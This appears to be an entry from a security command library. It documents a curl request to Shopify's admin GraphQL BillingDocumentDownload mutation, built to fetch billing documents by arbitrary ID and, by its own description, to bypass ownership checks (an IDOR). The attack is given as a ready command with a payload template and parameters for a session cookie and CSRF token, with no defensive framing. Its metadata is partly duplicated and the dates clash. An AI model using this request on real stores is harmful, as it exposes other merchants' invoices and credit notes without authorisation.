---
data: >
  curl -X POST
  "https://admin.shopify.com/api/shopify/[shop]/graph?operation=BillingDocumentDownload&type=mutation"
  -H "Content-Type: application/json" -H "Cookie: [redacted]" -H "User-Agent:
  Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101
  Firefox/110.0" -H "Accept: application/json" -H "X-Shopify-Web-Force-Proxy: 1"
  -H "X-Csrf-Token: [redacted]" -H "Caller-Pathname:
  /store/[shop]/access_account/invoice/[id]" -H "Origin:
  https://admin.shopify.com" -H "Sec-Fetch-Dest: empty" -H "Sec-Fetch-Mode:
  cors" -H "Sec-Fetch-Site: same-origin" -H "X-Pwnfox-Color: cyan" -H "Te:
  trailers" -d
  '{"operationName":"BillingDocumentDownload","variables":{"id":"[arbitrary_gid]","documentType":"CREDIT_NOTE"},"query":"mutation
  BillingDocumentDownload($id: ID!, $documentType: BillingDocumentType) {
  billingDocumentDownload(id: $id, documentType: $documentType) { job { id
  __typename } userErrors { field message __typename } __typename } }"}'

  output: null

  created_at: "2023-10-01T00:00:00Z"

  updated_at: "2023-10-01T00:00:00Z"

  platforms: ["Web"]

  tags: ["graphql", "mutation", "idor"]
tags:
  - graphql
  - mutation
  - idor
  - shopify
type: command
output: null
executor: bash
platforms:
  - Web
id: 54e6c33f-d595-4a4d-b67b-bca2fbbd18f9
created_at: '2025-12-14T17:26:00.216Z'
updated_at: '2025-12-14T17:26:00.216Z'
verified: false
validated: true
submitted: true
---
# shopify-graphql-billingdocumentdownload-mutation

## Command

```bash
curl -X POST "https://admin.shopify.com/api/shopify/[shop]/graph?operation=BillingDocumentDownload&type=mutation" [headers] -d '[JSON payload]'
```

## Description

Executes a GraphQL mutation to start a PDF download job for an arbitrary billing document ID, bypassing ownership checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| [shop] | Shop domain | Yes |
| [arbitrary_gid] | Invoice global ID | Yes |
| documentType | Enum: CREDIT_NOTE, INVOICE, etc. | Yes |
| Cookie | Session auth | Yes |
| X-Csrf-Token | CSRF token | Yes |

## Examples

### Basic Usage

```bash
curl [full mutation for INVOICE]
```

### Advanced Usage

```bash
curl [command] --data-raw '[payload]'
```

## Expected Output

JSON { data: { billingDocumentDownload: { job: { id: 'gid://...' } } } }, with job ID for download.

## Related

- [[Related Procedure: Generate-Billing-Document-PDF-via-GraphQL-Mutation]]
